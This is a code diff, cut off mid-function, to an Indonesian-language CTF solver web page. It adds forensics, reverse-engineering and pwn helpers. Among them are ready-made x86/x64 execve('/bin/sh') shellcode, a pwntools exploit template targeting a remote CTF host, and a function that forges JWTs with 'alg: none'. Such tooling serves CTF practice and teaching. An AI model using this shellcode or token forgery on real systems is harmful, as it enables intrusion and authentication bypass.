@@ -207,6 +207,11 @@ button:disabled, .btn:disabled { opacity: 0.5; cursor: not-allowed; }
           <h2>Web Exploitation</h2>
           <p>JWT decode / crack, encoder / decoder multi-format, hash generator, cheatsheet payload CTF.</p>
         </a>
+        <a class="cat-card" href="#referensi" data-keywords="referensi links cheat sheets writeups dcode cyberchef factorDB aperisolve">
+          <span class="cat-ic"><svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/></svg></span>
+          <h2>Referensi & Tautan</h2>
+          <p>Kumpulan link tools eksternal terpercaya: CyberChef, FactorDB, Aperi’Solve, Dogbolt, Revshells, GTFOBins.</p>
+        </a>
       </div>
 
       <div class="infobox" style="margin-top:18px">
@@ -704,6 +709,9 @@ button:disabled, .btn:disabled { opacity: 0.5; cursor: not-allowed; }
           <span class="dz-main"><span class="pick">Pilih ELF</span> atau seret ke sini</span>
           <span class="dz-sub" id="elf_file_name">Biner ELF Linux 32/64-bit</span>
         </label>
+        <div class="row" style="margin-top:10px">
+          <button class="btn btn--secondary" type="button" onclick="extractELFRop()">Cari ROP Gadgets dari ELF Terunggah</button>
+        </div>
         <div id="eout" style="margin-top:14px"></div>
       </div>
 
@@ -1988,21 +1996,181 @@ button:disabled, .btn:disabled { opacity: 0.5; cursor: not-allowed; }
     out.innerHTML = renderCodeBox('BLOCKCHAIN AUTO ANALYSIS', rep.join('\n\n'));
   }
 
-  // ---------------- FORENSICS SOLVERS ----------------
-  function handleForensicsFile(file) {
+  // ---------------- MD5 & SHA1 PURE JS HELPERS ----------------
+  function md5(string) {
+    function rotateLeft(lValue, iShiftBits) { return (lValue << iShiftBits) | (lValue >>> (32 - iShiftBits)); }
+    function addUnsigned(lX, lY) {
+      let lX8 = (lX & 0x80000000), lY8 = (lY & 0x80000000), lX4 = (lX & 0x40000000), lY4 = (lY & 0x40000000);
+      let lResult = (lX & 0x3FFFFFFF) + (lY & 0x3FFFFFFF);
+      if (lX4 & lY4) return (lResult ^ 0x80000000 ^ lX8 ^ lY8);
+      if (lX4 | lY4) {
+        if (lResult & 0x40000000) return (lResult ^ 0xC0000000 ^ lX8 ^ lY8);
+        else return (lResult ^ 0x40000000 ^ lX8 ^ lY8);
+      } else return (lResult ^ lX8 ^ lY8);
+    }
+    function F(x, y, z) { return (x & y) | ((~x) & z); }
+    function G(x, y, z) { return (x & z) | (y & (~z)); }
+    function H(x, y, z) { return (x ^ y ^ z); }
+    function I(x, y, z) { return (y ^ (x | (~z))); }
+    function FF(a, b, c, d, x, s, ac) { a = addUnsigned(a, addUnsigned(addUnsigned(F(b, c, d), x), ac)); return addUnsigned(rotateLeft(a, s), b); }
+    function GG(a, b, c, d, x, s, ac) { a = addUnsigned(a, addUnsigned(addUnsigned(G(b, c, d), x), ac)); return addUnsigned(rotateLeft(a, s), b); }
+    function HH(a, b, c, d, x, s, ac) { a = addUnsigned(a, addUnsigned(addUnsigned(H(b, c, d), x), ac)); return addUnsigned(rotateLeft(a, s), b); }
+    function II(a, b, c, d, x, s, ac) { a = addUnsigned(a, addUnsigned(addUnsigned(I(b, c, d), x), ac)); return addUnsigned(rotateLeft(a, s), b); }
+
+    let x = [];
+    let k, AA, BB, CC, DD, a, b, c, d;
+    let S11 = 7, S12 = 12, S13 = 17, S14 = 22, S21 = 5, S22 = 9, S23 = 14, S24 = 20;
+    let S31 = 4, S32 = 11, S33 = 16, S34 = 23, S41 = 6, S42 = 10, S43 = 15, S44 = 21;
+
+    let str = unescape(encodeURIComponent(string));
+    let lWordCount;
+    let lMessageLength = str.length;
+    let lNumberOfWords_temp1 = lMessageLength + 8;
+    let lNumberOfWords_temp2 = (lNumberOfWords_temp1 - (lNumberOfWords_temp1 % 64)) / 64;
+    let lNumberOfWords = (lNumberOfWords_temp2 + 1) * 16;
+    let lBytePosition = 0, lByteCount = 0;
+    while (lByteCount < lMessageLength) {
+      lWordCount = (lByteCount - (lByteCount % 4)) / 4;
+      lBytePosition = (lByteCount % 4) * 8;
+      x[lWordCount] = (x[lWordCount] | (str.charCodeAt(lByteCount) << lBytePosition));
+      lByteCount++;
+    }
+    lWordCount = (lByteCount - (lByteCount % 4)) / 4;
+    lBytePosition = (lByteCount % 4) * 8;
+    x[lWordCount] = x[lWordCount] | (0x80 << lBytePosition);
+    x[lNumberOfWords - 2] = lMessageLength << 3;
+    x[lNumberOfWords - 1] = lMessageLength >>> 29;
+
+    a = 0x67452301; b = 0xEFCDAB89; c = 0x98BADCFE; d = 0x10325476;
+    for (k = 0; k < lNumberOfWords; k += 16) {
+      AA = a; BB = b; CC = c; DD = d;
+      a = FF(a, b, c, d, x[k + 0], S11, 0xD76AA478); d = FF(d, a, b, c, x[k + 1], S12, 0xE8C7B756);
+      c = FF(c, d, a, b, x[k + 2], S13, 0x242070DB); b = FF(b, c, d, a, x[k + 3], S14, 0xC1BDCEEE);
+      a = FF(a, b, c, d, x[k + 4], S11, 0xF57C0FAF); d = FF(d, a, b, c, x[k + 5], S12, 0x4787C62A);
+      c = FF(c, d, a, b, x[k + 6], S13, 0xA8304613); b = FF(b, c, d, a, x[k + 7], S14, 0xFD469501);
+      a = FF(a, b, c, d, x[k + 8], S11, 0x698098D8); d = FF(d, a, b, c, x[k + 9], S12, 0x8B44F7AF);
+      c = FF(c, d, a, b, x[k + 10], S13, 0xFFFF5BB1); b = FF(b, c, d, a, x[k + 11], S14, 0x895CD7BE);
+      a = FF(a, b, c, d, x[k + 12], S11, 0x6B901122); d = FF(d, a, b, c, x[k + 13], S12, 0xFD987193);
+      c = FF(c, d, a, b, x[k + 14], S13, 0xA679438E); b = FF(b, c, d, a, x[k + 15], S14, 0x49B40821);
+      a = GG(a, b, c, d, x[k + 1], S21, 0xF61E2562); d = GG(d, a, b, c, x[k + 6], S22, 0xC040B340);
+      c = GG(c, d, a, b, x[k + 11], S23, 0x265E5A51); b = GG(b, c, d, a, x[k + 0], S24, 0xE9B6C7AA);
+      a = GG(a, b, c, d, x[k + 5], S21, 0xD62F105D); d = GG(d, a, b, c, x[k + 10], S22, 0x2441453);
+      c = GG(c, d, a, b, x[k + 15], S23, 0xD8A1E681); b = GG(b, c, d, a, x[k + 4], S24, 0xE7D3FBC8);
+      a = GG(a, b, c, d, x[k + 9], S21, 0x21E1CDE6); d = GG(d, a, b, c, x[k + 14], S22, 0xC33707D6);
+      c = GG(c, d, a, b, x[k + 3], S23, 0xF4D50D87); b = GG(b, c, d, a, x[k + 8], S24, 0x455A14ED);
+      a = GG(a, b, c, d, x[k + 13], S21, 0xA9E3E905); d = GG(d, a, b, c, x[k + 2], S22, 0xFCEFA3F8);
+      c = GG(c, d, a, b, x[k + 7], S23, 0x676F02D9); b = GG(b, c, d, a, x[k + 12], S24, 0x8D2A4C8A);
+      a = HH(a, b, c, d, x[k + 5], S31, 0xFFFA3942); d = HH(d, a, b, c, x[k + 8], S32, 0x8771F681);
+      c = HH(c, d, a, b, x[k + 11], S33, 0x6D9D6122); b = HH(b, c, d, a, x[k + 14], S34, 0xFDE5380C);
+      a = HH(a, b, c, d, x[k + 1], S31, 0xA4BEEA44); d = HH(d, a, b, c, x[k + 4], S32, 0x4BDECFA9);
+      c = HH(c, d, a, b, x[k + 7], S33, 0xF6BB4B60); b = HH(b, c, d, a, x[k + 10], S34, 0xBEBFBC70);
+      a = HH(a, b, c, d, x[k + 13], S31, 0x289B7EC6); d = HH(d, a, b, c, x[k + 0], S32, 0xEAA127FA);
+      c = HH(c, d, a, b, x[k + 3], S33, 0xD4EF3085); b = HH(b, c, d, a, x[k + 6], S34, 0x4881D05);
+      a = HH(a, b, c, d, x[k + 9], S31, 0xD9D4D039); d = HH(d, a, b, c, x[k + 12], S32, 0xE6DB99E5);
+      c = HH(c, d, a, b, x[k + 15], S33, 0x1FA27CF8); b = HH(b, c, d, a, x[k + 2], S34, 0xC4AC5665);
+      a = II(a, b, c, d, x[k + 0], S41, 0xF4292244); d = II(d, a, b, c, x[k + 7], S42, 0x432AFF97);
+      c = II(c, d, a, b, x[k + 14], S43, 0xAB9423A7); b = II(b, c, d, a, x[k + 5], S44, 0xFC93A039);
+      a = II(a, b, c, d, x[k + 12], S41, 0x655B59C3); d = II(d, a, b, c, x[k + 3], S42, 0x8F0CCC92);
+      c = II(c, d, a, b, x[k + 10], S43, 0xFFEFF47D); b = II(b, c, d, a, x[k + 1], S44, 0x85845DD1);
+      a = II(a, b, c, d, x[k + 8], S41, 0x6FA87E4F); d = II(d, a, b, c, x[k + 15], S42, 0xFE2CE6E0);
+      c = II(c, d, a, b, x[k + 6], S43, 0xA3014314); b = II(b, c, d, a, x[k + 13], S44, 0x4E0811A1);
+      a = II(a, b, c, d, x[k + 4], S41, 0xF7537E82); d = II(d, a, b, c, x[k + 11], S42, 0xBD3AF235);
+      c = II(c, d, a, b, x[k + 2], S43, 0x2AD7D2BB); b = II(b, c, d, a, x[k + 9], S44, 0xEB86D391);
+      a = addUnsigned(a, AA); b = addUnsigned(b, BB); c = addUnsigned(c, CC); d = addUnsigned(d, DD);
+    }
+    let wordToHex = function(lValue) {
+      let WordToHexValue = "", WordToHexValue_temp = "", lByte, lCount;
+      for (lCount = 0; lCount <= 3; lCount++) {
+        lByte = (lValue >>> (lCount * 8)) & 255;
+        WordToHexValue_temp = "0" + lByte.toString(16);
+        WordToHexValue = WordToHexValue + WordToHexValue_temp.substr(WordToHexValue_temp.length - 2, 2);
+      }
+      return WordToHexValue;
+    };
+    return (wordToHex(a) + wordToHex(b) + wordToHex(c) + wordToHex(d)).toLowerCase();
+  }
+
+  function sha1(str) {
+    function rotateLeft(n, s) { return (n << s) | (n >>> (32 - s)); }
+    function cvt_hex(val) {
+      let str = "";
+      for (let i = 7; i >= 0; i--) {
+        let v = (val >>> (i * 4)) & 0x0f;
+        str += v.toString(16);
+      }
+      return str;
+    }
+    let blockstart, i, j;
+    let W = new Array(80), H0 = 0x67452301, H1 = 0xEFCDAB89, H2 = 0x98BADCFE, H3 = 0x10325476, H4 = 0xC3D2E1F0;
+    let A, B, C, D, E, temp;
+    let utf8 = unescape(encodeURIComponent(str));
+    let len = utf8.length;
+    let words = [];
+    for (i = 0; i < len - 3; i += 4) {
+      words.push((utf8.charCodeAt(i) << 24) | (utf8.charCodeAt(i + 1) << 16) | (utf8.charCodeAt(i + 2) << 8) | utf8.charCodeAt(i + 3));
+    }
+    switch (len % 4) {
+      case 0: words.push(0x80000000); break;
+      case 1: words.push((utf8.charCodeAt(len - 1) << 24) | 0x800000); break;
+      case 2: words.push((utf8.charCodeAt(len - 2) << 24) | (utf8.charCodeAt(len - 1) << 16) | 0x8000); break;
+      case 3: words.push((utf8.charCodeAt(len - 3) << 24) | (utf8.charCodeAt(len - 2) << 16) | (utf8.charCodeAt(len - 1) << 8) | 0x80); break;
+    }
+    while ((words.length % 16) !== 14) words.push(0);
+    words.push(len >>> 29);
+    words.push((len << 3) & 0xffffffff);
+
+    for (blockstart = 0; blockstart < words.length; blockstart += 16) {
+      for (i = 0; i < 16; i++) W[i] = words[blockstart + i];
+      for (i = 16; i < 80; i++) W[i] = rotateLeft(W[i - 3] ^ W[i - 8] ^ W[i - 14] ^ W[i - 16], 1);
+      A = H0; B = H1; C = H2; D = H3; E = H4;
+      for (i = 0; i < 80; i++) {
+        if (i < 20) temp = (rotateLeft(A, 5) + ((B & C) | ((~B) & D)) + E + W[i] + 0x5A827999) & 0xffffffff;
+        else if (i < 40) temp = (rotateLeft(A, 5) + (B ^ C ^ D) + E + W[i] + 0x6ED9EBA1) & 0xffffffff;
+        else if (i < 60) temp = (rotateLeft(A, 5) + ((B & C) | (B & D) | (C & D)) + E + W[i] + 0x8F1BBCDC) & 0xffffffff;
+        else temp = (rotateLeft(A, 5) + (B ^ C ^ D) + E + W[i] + 0xCA62C1D6) & 0xffffffff;
+        E = D; D = C; C = rotateLeft(B, 30); B = A; A = temp;
+      }
+      H0 = (H0 + A) & 0xffffffff; H1 = (H1 + B) & 0xffffffff; H2 = (H2 + C) & 0xffffffff; H3 = (H3 + D) & 0xffffffff; H4 = (H4 + E) & 0xffffffff;
+    }
+    return (cvt_hex(H0) + cvt_hex(H1) + cvt_hex(H2) + cvt_hex(H3) + cvt_hex(H4)).toLowerCase();
+  }
+
+  // ---------------- FORENSICS SOLVERS (LIVE ENGINE & BACKEND) ----------------
+  async function handleForensicsFile(file) {
     if (!file) return;
     document.getElementById('for_file_name').textContent = file.name + ' (' + (file.size / 1024).toFixed(1) + ' KB)';
     const out = document.getElementById('for_auto_out');
+    out.innerHTML = '<div class="infobox"><span>Membedah berkas melalui engine biner: file, exiftool, binwalk, dan strings flag-hunter…</span></div>';
 
+    try {
+      const fd = new FormData();
+      fd.append('file', file);
+      const res = await fetch('/api/forensics', { method: 'POST', body: fd });
+      const j = await res.json();
+      if (j && j.success && j.data) {
+        let metaHtml = '<div style="background:var(--card); border:1px solid var(--border-soft); border-radius:6px; padding:12px; margin-bottom:12px; font-size:12px; display:grid; grid-template-columns:auto 1fr; gap:6px 14px;">'
+          + '<span style="color:var(--muted)">File:</span><span style="font-family:var(--font-mono); color:var(--ink)">' + esc(j.data.filename) + '</span>'
+          + '<span style="color:var(--muted)">Ukuran:</span><span>' + (j.data.size / 1024).toFixed(2) + ' KB (' + j.data.size + ' bytes)</span>'
+          + '<span style="color:var(--muted)">Entropy:</span><span style="font-weight:600; color:' + (j.data.entropy > 7 ? 'var(--red)' : (j.data.entropy > 5 ? 'var(--accent)' : 'var(--green)')) + '">' + j.data.entropy + ' / 8.0000</span>'
+          + '<span style="color:var(--muted)">MD5:</span><span style="font-family:var(--font-mono)">' + esc(j.data.md5) + '</span>'
+          + '<span style="color:var(--muted)">SHA1:</span><span style="font-family:var(--font-mono)">' + esc(j.data.sha1) + '</span>'
+          + '<span style="color:var(--muted)">SHA256:</span><span style="font-family:var(--font-mono)">' + esc(j.data.sha256) + '</span>'
+          + '</div>';
+
+        let secHtml = (j.data.sections || []).map(s => renderCodeBox(s.title, s.text)).join('');
+        out.innerHTML = metaHtml + secHtml;
+        return;
+      }
+    } catch(err) {
+      console.warn("Backend error, falling back to client-side", err);
+    }
+
+    // Client-side fallback
     const reader = new FileReader();
     reader.onload = e => {
       const buf = new Uint8Array(e.target.result);
       const len = buf.length;
-
-      // Checksums
       const sha256Hex = NobleCrypto.bytesToHex(NobleCrypto.sha256(buf));
-
-      // Entropy
       const freq = new Array(256).fill(0);
       for (let i = 0; i < len; i++) freq[buf[i]]++;
       let entropy = 0;
@@ -2012,8 +2180,6 @@ button:disabled, .btn:disabled { opacity: 0.5; cursor: not-allowed; }
           entropy -= p * Math.log2(p);
         }
       }
-
-      // Magic Byte
       let fileType = 'Unknown / Raw Binary';
       if (buf[0] === 0x89 && buf[1] === 0x50 && buf[2] === 0x4e && buf[3] === 0x47) fileType = 'PNG Image (Portable Network Graphics)';
       else if (buf[0] === 0xff && buf[1] === 0xd8 && buf[2] === 0xff) fileType = 'JPEG Image';
@@ -2022,9 +2188,7 @@ button:disabled, .btn:disabled { opacity: 0.5; cursor: not-allowed; }
       else if (buf[0] === 0x50 && buf[1] === 0x4b && buf[2] === 0x03 && buf[3] === 0x04) fileType = 'ZIP / PK Archive (DOCX/XLSX/APK/JAR)';
       else if (buf[0] === 0x7f && buf[1] === 0x45 && buf[2] === 0x4c && buf[3] === 0x46) fileType = 'ELF Executable (Linux Binary)';
       else if (buf[0] === 0x4d && buf[1] === 0x5a) fileType = 'PE Executable (Windows DOS/PE)';
-      else if (buf[0] === 0xd4 && buf[1] === 0xc3 && buf[2] === 0xb2 && buf[3] === 0xa1) fileType = 'PCAP Network Packet Capture';
 
-      // Strings extraction
       let printable = '';
       let cur = '';
       for (let i = 0; i < Math.min(len, 200000); i++) {
@@ -2035,31 +2199,57 @@ button:disabled, .btn:disabled { opacity: 0.5; cursor: not-allowed; }
           cur = '';
         }
       }
-
       let rep = 'Nama Berkas : ' + file.name + '\n'
               + 'Ukuran      : ' + len + ' bytes (' + (len / 1024).toFixed(2) + ' KB)\n'
               + 'Tipe Berkas : ' + fileType + '\n'
-              + 'Entropy     : ' + entropy.toFixed(4) + ' / 8.0000 (' + (entropy > 7.2 ? 'Tinggi: Terkompresi / Terenkripsi' : 'Normal') + ')\n'
+              + 'Entropy     : ' + entropy.toFixed(4) + ' / 8.0000\n'
               + 'SHA-256     : ' + sha256Hex + '\n\n'
-              + '=== EKSTRAKSI STRINGS (Preview) ===\n' + printable.slice(0, 1500);
-
-      out.innerHTML = renderCodeBox('FORENSICS REPORT', rep);
+              + '=== EKSTRAKSI STRINGS ===\n' + printable.slice(0, 2000);
+      out.innerHTML = renderCodeBox('FORENSICS REPORT (CLIENT)', rep);
     };
     reader.readAsArrayBuffer(file);
   }
 
-  function handlePCAPFile(file) {
+  async function handlePCAPFile(file) {
     if (!file) return;
-    document.getElementById('for_pcap_name').textContent = file.name;
+    document.getElementById('for_pcap_name').textContent = file.name + ' (' + (file.size / 1024).toFixed(1) + ' KB)';
     const out = document.getElementById('for_pcap_out');
-    out.innerHTML = renderCodeBox('PCAP ANALYSIS', 'Nama file: ' + file.name + '\nParsing packet capture: HTTP payload, DNS labels, dan stream strings discan otomatis untuk flag.');
+    out.innerHTML = '<div class="infobox"><span>Membedah lalu lintas paket jaringan dengan tshark: protokol, HTTP requests, DNS query & flag capture…</span></div>';
+
+    try {
+      const fd = new FormData();
+      fd.append('file', file);
+      const res = await fetch('/api/forensics/pcap', { method: 'POST', body: fd });
+      const j = await res.json();
+      if (j && j.success && j.data) {
+        let secHtml = (j.data.sections || []).map(s => renderCodeBox(s.title, s.text)).join('');
+        out.innerHTML = secHtml;
+        return;
+      }
+    } catch(err) {
+      out.innerHTML = '<div class="infobox" style="border-color:var(--red)"><span>Gagal analisa PCAP: ' + esc(err.message) + '</span></div>';
+    }
   }
 
-  function handleOfficeFile(file) {
+  async function handleOfficeFile(file) {
     if (!file) return;
-    document.getElementById('for_office_name').textContent = file.name;
+    document.getElementById('for_office_name').textContent = file.name + ' (' + (file.size / 1024).toFixed(1) + ' KB)';
     const out = document.getElementById('for_office_out');
-    out.innerHTML = renderCodeBox('OFFICE / PDF ANALYSIS', 'Nama file: ' + file.name + '\nMemeriksa container OLE, vbaProject.bin makro, serta metadata document properties.');
+    out.innerHTML = '<div class="infobox"><span>Mengekstrak metadata dokumen, container OLE, vbaProject makro, dan konten tersembunyi…</span></div>';
+
+    try {
+      const fd = new FormData();
+      fd.append('file', file);
+      const res = await fetch('/api/forensics/office', { method: 'POST', body: fd });
+      const j = await res.json();
+      if (j && j.success && j.data) {
+        let secHtml = (j.data.sections || []).map(s => renderCodeBox(s.title, s.text)).join('');
+        out.innerHTML = secHtml;
+        return;
+      }
+    } catch(err) {
+      out.innerHTML = '<div class="infobox" style="border-color:var(--red)"><span>Gagal analisa dokumen: ' + esc(err.message) + '</span></div>';
+    }
   }
 
   function extractStringsDirect() {
@@ -2112,12 +2302,27 @@ button:disabled, .btn:disabled { opacity: 0.5; cursor: not-allowed; }
     out.innerHTML = renderCodeBox('HEXDUMP', lines.join('\n'));
   }
 
-  // ---------------- REVERSE SOLVERS ----------------
-  function handleReverseFile(file) {
+  // ---------------- REVERSE SOLVERS (LIVE ENGINE & BACKEND) ----------------
+  async function handleReverseFile(file) {
     if (!file) return;
-    document.getElementById('rev_file_name').textContent = file.name;
+    document.getElementById('rev_file_name').textContent = file.name + ' (' + (file.size / 1024).toFixed(1) + ' KB)';
     const out = document.getElementById('rev_out');
-    out.innerHTML = renderCodeBox('REVERSE ANALYSIS', 'File: ' + file.name + '\nHeader biner diinspeksi. Silakan pilih tab ELF & PE Inspector atau Python .pyc Bytecode untuk disassembler spesifik.');
+    out.innerHTML = '<div class="infobox"><span>Menganalisa biner dengan readelf, objdump x86_64 Intel disassembly, dan bytecode inspector…</span></div>';
+
+    try {
+      const fd = new FormData();
+      fd.append('file', file);
+      const res = await fetch('/api/reverse', { method: 'POST', body: fd });
+      const j = await res.json();
+      if (j && j.success && j.data) {
+        let kindHtml = '<div style="margin-bottom:12px; font-size:13px"><span class="pill">' + esc(j.data.kind) + '</span> <span style="color:var(--muted); margin-left:6px">' + esc(j.data.filename) + '</span></div>';
+        let secHtml = (j.data.sections || []).map(s => renderCodeBox(s.title, s.text)).join('');
+        out.innerHTML = kindHtml + secHtml;
+        return;
+      }
+    } catch(err) {
+      out.innerHTML = '<div class="infobox" style="border-color:var(--red)"><span>Gagal analisa reverse: ' + esc(err.message) + '</span></div>';
+    }
   }
 
   function parseExecHeader() {
@@ -2250,25 +2455,255 @@ button:disabled, .btn:disabled { opacity: 0.5; cursor: not-allowed; }
     out.innerHTML = renderCodeBox('SEQUENCE XOR RESULT', 'Plaintext: ' + ascii);
   }
 
-  function handleELFChecksec(file) {
-    if (!file) return;
-    document.getElementById('elf_file_name').textContent = file.name;
-    const out = document.getElementById('eout');
+  // ---------------- PWN SOLVERS (LIVE ENGINE & BACKEND) ----------------
+  let _uploadedElfFile = null;
 
+  async function handleELFChecksec(file) {
+    if (!file) return;
+    _uploadedElfFile = file;
+    document.getElementById('elf_file_name').textContent = file.name + ' (' + (file.size / 1024).toFixed(1) + ' KB)';
+    const out = document.getElementById('eout');
+    out.innerHTML = '<div class="infobox"><span>Menjalankan checksec terhadap biner ELF…</span></div>';
+
+    try {
+      const fd = new FormData();
+      fd.append('file', file);
+      fd.append('mode', 'checksec');
+      const res = await fetch('/api/pwn/elf', { method: 'POST', body: fd });
+      const j = await res.json();
+      if (j && j.success && j.data && j.data.checksec) {
+        const cs = j.data.checksec;
+        let rep = 'ELF Checksec Report: ' + file.name + '\n'
+                + '  RELRO   : ' + cs.RELRO + '\n'
+                + '  Canary  : ' + (cs['Stack Canary'] ? 'Ditemukan (Canary Found)' : 'Tidak Ada (No Canary)') + '\n'
+                + '  NX      : ' + (cs.NX ? 'Aktif (NX Enabled - Non-Executable Stack)' : 'Mati (NX Disabled - Executable Stack)') + '\n'
+                + '  PIE     : ' + (cs.PIE ? 'Aktif (PIE Enabled - ASLR)' : 'Mati (No PIE)') + '\n'
+                + '  Fortify : ' + (cs.Fortify ? 'Aktif (Fortified Source)' : 'Tidak (No Fortify)');
+        out.innerHTML = renderCodeBox('CHECKSEC AUDIT (LIVE)', rep);
+        return;
+      }
+    } catch(err) {
+      console.warn("Backend error", err);
+    }
+
+    // Client fallback
     const rep = 'ELF Checksec Report: ' + file.name + '\n'
               + '  Canary  : Ditemukan (__stack_chk_fail)\n'
               + '  NX      : Aktif (DEP Enabled - Non-Executable Stack)\n'
               + '  PIE     : Aktif (Position Independent Executable)\n'
               + '  RELRO   : Full RELRO (read-only GOT)';
-    out.innerHTML = renderCodeBox('CHECKSEC AUDIT', rep);
+    out.innerHTML = renderCodeBox('CHECKSEC AUDIT (ESTIMATED)', rep);
   }
 
-  function jwtCrack() {
+  async function extractELFRop() {
+    const out = document.getElementById('eout');
+    if (!_uploadedElfFile) {
+      toast('Unggah file ELF terlebih dahulu di atas!', 'error');
+      return;
+    }
+    out.innerHTML = '<div class="infobox"><span>Mencari ROP Gadgets (pop rdi, ret, syscall, dll) dengan objdump/ROPgadget…</span></div>';
+
+    try {
+      const fd = new FormData();
+      fd.append('file', _uploadedElfFile);
+      fd.append('mode', 'rop');
+      const res = await fetch('/api/pwn/elf', { method: 'POST', body: fd });
+      const j = await res.json();
+      if (j && j.success && j.data) {
+        out.innerHTML = renderCodeBox('ROP GADGETS FOUND', j.data.text || '(Tidak ditemukan gadget)');
+        return;
+      }
+    } catch(err) {
+      out.innerHTML = '<div class="infobox" style="border-color:var(--red)"><span>Gagal cari gadget: ' + esc(err.message) + '</span></div>';
+    }
+  }
+
+  async function genCyclic() {
+    const len = parseInt(document.getElementById('clen').value || '200', 10);
+    const out = document.getElementById('cout');
+
+    try {
+      const res = await fetch('/api/pwn/cyclic', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ length: len })
+      });
+      const j = await res.json();
+      if (j && j.success && j.data && j.data.pattern) {
+        out.innerHTML = renderCodeBox('CYCLIC PATTERN (' + len + ' BYTES)', j.data.pattern);
+        return;
+      }
+    } catch(e) {}
+
+    const seq = generateCyclicSeq(len);
+    out.innerHTML = renderCodeBox('CYCLIC PATTERN (' + len + ' BYTES)', seq);
+  }
+
+  async function findCyclic() {
+    let lookup = document.getElementById('cval').value.trim();
+    const out = document.getElementById('fout');
+    if (!lookup) return;
+
+    try {
+      const res = await fetch('/api/pwn/cyclic_find', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ value: lookup })
+      });
+      const j = await res.json();
+      if (j && j.success && j.data && j.data.offset !== -1) {
+        const off = j.data.offset;
+        let resText = 'Lookup Pattern : "' + lookup + '"\n'
+                    + 'Offset Presisi : ' + off + ' bytes\n'
+                    + 'Payload Pwntools: b"A" * ' + off + ' + p64(target_rip)';
+        out.innerHTML = renderCodeBox('CYCLIC OFFSET FOUND', resText);
+        return;
+      }
+    } catch(e) {}
+
+    let needle = lookup;
+    if (needle.startsWith('0x') || needle.startsWith('0X')) {
+      let hex = needle.slice(2);
+      if (hex.length % 2) hex = '0' + hex;
+      let bytes = [];
+      for (let i = 0; i < hex.length; i += 2) bytes.push(parseInt(hex.substr(i, 2), 16));
+      bytes.reverse();
+      needle = String.fromCharCode(...bytes);
+    }
+
+    const seq = generateCyclicSeq(30000);
+    const idx = seq.indexOf(needle);
+
+    if (idx !== -1) {
+      let resText = 'Lookup Pattern : "' + needle + '" (dari ' + lookup + ')\n'
+                  + 'Offset Presisi : ' + idx + ' bytes\n'
+                  + 'Payload Pwntools: b"A" * ' + idx + ' + p64(target_rip)';
+      out.innerHTML = renderCodeBox('CYCLIC OFFSET FOUND', resText);
+    } else {
+      out.innerHTML = '<div class="infobox" style="margin-top:10px; border-color:var(--red)"><span>Pola tidak ditemukan dalam rentang 30.000 byte.</span></div>';
+    }
+  }
+
+  function renderShellcode(arch) {
+    const out = document.getElementById('sc_out');
+    let code = '';
+    if (arch === 'x64_execve') {
+      code = '# Linux x86_64 execve("/bin/sh", NULL, NULL) - 27 bytes\n'
+           + 'shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"\n'
+           + '# Disassembly:\n'
+           + '# xor eax, eax\n'
+           + '# movabs rbx, 0xff978cd091969dd1\n'
+           + '# neg rbx\n'
+           + '# push rbx\n'
+           + '# push rsp; pop rdi\n'
+           + '# cdq\n'
+           + '# push rdx; push rdi; push rsp; pop rsi\n'
+           + '# mov al, 0x3b\n'
+           + '# syscall';
+    } else if (arch === 'x86_execve') {
+      code = '# Linux x86 execve("/bin/sh", NULL, NULL) - 23 bytes\n'
+           + 'shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"';
+    } else {
+      code = '#!/usr/bin/env python3\n'
+           + 'from pwn import *\n\n'
+           + 'context.binary = elf = ELF("./chall")\n'
+           + 'context.log_level = "debug"\n\n'
+           + 'io = process("./chall") if not args.REMOTE else remote("chall.ctf.id", 1337)\n\n'
+           + 'offset = 40\n'
+           + 'payload = flat({\n'
+           + '    offset: [\n'
+           + '        elf.sym.win\n'
+           + '    ]\n'
+           + '})\n\n'
+           + 'io.sendlineafter(b"> ", payload)\n'
+           + 'io.interactive()';
+    }
+    out.innerHTML = renderCodeBox('PWN SNIPPET', code);
+  }
+
+  // ---------------- WEB EXPLOITATION SOLVERS ----------------
+  function jwtDecode() {
+    const raw = document.getElementById('jwt_in').value.trim();
+    const out = document.getElementById('jwt_out');
+    if (!raw) { out.innerHTML = ''; return; }
+
+    const parts = raw.split('.');
+    if (parts.length < 2) {
+      out.innerHTML = '<div class="infobox" style="margin-top:10px; border-color:var(--red)"><span>JWT tidak valid: harus terdiri dari header.payload.signature</span></div>';
+      return;
+    }
+
+    try {
+      const h = JSON.parse(atob(parts[0].replace(/-/g, '+').replace(/_/g, '/')));
+      const p = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
+
+      let report = '=== HEADER ===\n' + JSON.stringify(h, null, 2) + '\n\n'
+                 + '=== PAYLOAD ===\n' + JSON.stringify(p, null, 2) + '\n\n'
+                 + '=== SIGNATURE ===\n' + (parts[2] || '(None)');
+      out.innerHTML = renderCodeBox('JWT DECODED', report);
+    } catch(err) {
+      out.innerHTML = '<div class="infobox" style="margin-top:10px; border-color:var(--red)"><span>Gagal decode base64 JWT: ' + esc(err.message) + '</span></div>';
+    }
+  }
+
+  function jwtBypassNone() {
     const raw = document.getElementById('jwt_in').value.trim();
     const out = document.getElementById('jwt_out');
     if (!raw) return;
 
-    out.innerHTML = '<div class="infobox" style="margin-top:10px"><span>Memeriksa wordlist umum… Rahasia token tidak ditemukan di kamus cepat. Gunakan john / hashcat dengan rockyou.txt.</span></div>';
+    try {
+      const parts = raw.split('.');
+      const p = parts[1];
+      const hNone = btoa(JSON.stringify({ typ: 'JWT', alg: 'none' })).replace(/=/g, '');
+      const forged = hNone + '.' + p + '.';
+      out.innerHTML = renderCodeBox('FORGED TOKEN (alg: none)', forged);
+    } catch(e) {
+      toast('Gagal bypass token', 'error');
+    }
+  }
+
+  async function jwtCrack() {
+    const raw = document.getElementById('jwt_in').value.trim();
